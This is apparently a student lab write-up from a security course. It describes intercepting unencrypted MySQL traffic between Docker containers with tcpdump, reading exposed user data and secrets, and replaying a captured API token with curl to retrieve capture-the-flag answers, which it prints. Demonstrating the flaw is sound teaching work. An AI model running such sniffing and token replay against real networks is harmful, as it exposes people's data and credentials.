## Man-in-the-Middle (MITM) Attack – Network Traffic Analysis

This directory contains the work for Part 2 of the assignment, where a
Man-in-the-Middle (MITM) attack is performed on the communication between
a web application and its MySQL database running inside Docker containers.

The goal is to determine whether the database traffic is properly secured
and whether sensitive information can be intercepted.

---


## Task 2.1: Network Traffic Analysis

## Step 1: Identify the Docker Network

First, list the available Docker networks and identify the vulnerable network
used by the web application and database.

```bash
docker network ls
docker network inspect csce413_assignment2_vulnerable_network
```
From the inspection output, note the Docker bridge interface name
(e.g., br-xxxxxxxxxx), which will be used for traffic capture.

---

## Step 2: Identify Container IP Addresses

Next, obtain the IP addresses of the web application and database containers.

```bash
docker inspect 2_network_webapp | grep IPAddress
docker inspect 2_network_database | grep IPAddress
```
These IP addresses confirm that both services are communicating over the
internal Docker network.

---

## Step 3: Capture Database Traffic

To intercept database communication, traffic on port 3306 (MySQL) is
captured using tcpdump on the Docker bridge interface.

```bash
sudo tcpdump -i br-<network_id> -A -s 0 port 3306 -w mysql_traffic.pcap
```
For my case:
```bash
sudo tcpdump -i br-b6a634d49335 -A -s 0 port 3306 -w mysql_traffic.pcap
```
NOTE: Leave This Running
---

## Step 4: Generate database traffic

While tcpdump is running, interact with the web application in a browser:
- Open: http://localhost:5001
- Navigate through different pages
- Trigger database queries (users, secrets, etc.)
Stop the capture after sufficient traffic has been generated.

The captured traffic is saved as:
mysql_traffic.pcap

---

## Step 4: Analyze Captured Traffic

The captured packets are analyzed offline to inspect database queries.

```bash
tcpdump -A -r mysql_traffic.pcap | grep -iA 5 "SELECT"
```
Observed results include plaintext SQL queries such as:
    
    SELECT id, username, email, role FROM users
    SELECT id, secret_name, secret_value FROM secrets

User information, emails, roles, and secret values are visible directly
in the packet payloads.

---

## Step 5: Vulnerability Explanation

The database communication is not encrypted.
Because the web application and database share the same Docker network,
an attacker with network access can:
- Intercept SQL queries and responses
- Extract sensitive user data
- Steal secrets and authentication tokens
This confirms the presence of a Man-in-the-Middle vulnerability.


## Task 2.2: Capture Flag 3

## Step 1: Understanding the Hint

Flag 1 was discovered during the MITM attack:
```bash
FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}
```
This value appears in the database as:

```bash
secret_name = api_token
secret_value = FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}
```
This means Flag 1 is actually an API authentication token.

---

## Step 2: Discover the hidden API service

Accessing the internal API shows that authentication is required:

```bash
curl http://172.20.0.21:8888/
```
The response indicates a Bearer token is needed.

---

## Step 3: Use the stolen token to retrieve Flag 3

Authenticate using the token extracted via MITM:

```bash
curl -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}" \
http://172.20.0.21:8888/flag
```
Result:
```bash
FLAG{p0rt_kn0ck1ng_4nd_h0n3yp0ts_s4v3_th3_d4y}
```

---